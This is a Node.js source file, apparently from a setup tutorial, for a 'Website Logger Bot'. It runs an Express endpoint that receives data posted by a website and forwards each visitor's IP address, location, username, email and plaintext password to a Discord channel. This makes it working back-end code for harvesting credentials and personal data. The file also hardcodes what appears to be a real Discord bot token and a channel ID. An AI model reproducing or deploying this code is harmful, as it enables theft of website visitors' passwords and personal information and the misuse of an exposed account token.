const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const app = express();

// Your bot token from Step 1.2
const BOT_TOKEN = process.env.BOT_TOKEN || 'MTQxMjg3ODY4OTgwODU0NzkyMQ.GyvZg0.qFzS8fPXhpcaD6M-kY6ulEq2Nz2qQ3-wbASS5c';
// Your channel ID from Step 2.2
const LOG_CHANNEL = process.env.CHANNEL_ID || '1410314120787525652';

const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
});

let isReady = false;

client.once('ready', () => {
    console.log('🔍 Website Logger Bot is online!');
    isReady = true;
});

// Login to Discord
client.login(BOT_TOKEN);

// Web server to receive data from your website
app.use(express.json());

app.post('/log', async (req, res) => {
    const data = req.body;
    console.log('📥 Received data:', data.type);
    
    if (isReady) {
        try {
            const channel = await client.channels.fetch(LOG_CHANNEL);
            let message = `**${data.type}**\n`;
            
            if (data.ip) message += `🌐 IP: ${data.ip}\n`;
            if (data.location) message += `📍 Location: ${data.location}\n`;
            if (data.username) message += `👤 Username: ${data.username}\n`;
            if (data.email) message += `📧 Email: ${data.email}\n`;
            if (data.password) message += `🔑 Password: ${data.password}\n`;
            if (data.userAgent) message += `🖥️ User Agent: ${data.userAgent.substring(0, 50)}...\n`;
            
            message += `⏰ ${new Date().toLocaleString()}`;
            
            await channel.send(message);
            console.log('✅ Sent to Discord');
        } catch (error) {
            console.log('❌ Error sending to Discord:', error.message);
        }
    }
    
    res.send('Data received');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Server running on port ${PORT}`);
});
